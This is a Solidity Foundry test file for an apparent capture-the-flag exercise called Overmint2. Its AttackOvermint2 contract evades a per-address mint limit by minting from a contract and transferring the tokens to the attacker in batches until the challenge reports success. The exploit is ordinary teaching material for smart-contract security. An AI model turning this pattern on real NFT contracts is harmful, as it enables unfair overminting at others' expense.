// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint2} from "../src/Overmint2.sol";
import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint2Test is Test {
    Overmint2 overmint2;
    AttackOvermint2 attackOvermint2;
    address admin;
    address user1;
    address user2;

    function setUp() public {
        admin = address(this);
        user1 = address(0x1);
        user2 = address(0x2);

        overmint2 = new Overmint2();
        attackOvermint2 = new AttackOvermint2(address(overmint2), user1);
    }

    function testAttack() public {
        vm.startPrank(user1);
        attackOvermint2.attack();
        assertTrue(overmint2.success());
    }
}

contract AttackOvermint2 {
    Overmint2 overmint2;
    address attacker;

    constructor(address _overmint1, address _attacker) {
        overmint2 = Overmint2(_overmint1);
        attacker = _attacker;
    }

    function attack() public {
        overmint2.mint();
        overmint2.mint();
        overmint2.mint();
        overmint2.transferFrom(address(this), attacker, 1);
        overmint2.transferFrom(address(this), attacker, 2);
        overmint2.transferFrom(address(this), attacker, 3);
        overmint2.mint();
        overmint2.mint();
        overmint2.transferFrom(address(this), attacker, 4);
        overmint2.transferFrom(address(this), attacker, 5);
    }
}
